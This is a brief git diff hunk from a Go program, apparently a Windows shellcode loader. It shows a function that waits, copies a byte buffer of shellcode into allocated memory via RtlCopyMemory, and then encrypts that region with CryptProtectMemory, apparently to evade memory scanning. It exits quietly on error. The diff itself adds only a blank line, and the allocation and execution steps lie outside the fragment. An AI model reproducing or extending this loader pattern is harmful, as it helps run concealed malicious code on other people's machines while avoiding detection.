@@ -61,6 +61,7 @@ func exe(charcode []byte) {
 	}
 	time.Sleep(2 * time.Second)
 	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
+
 	procCryptProtectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
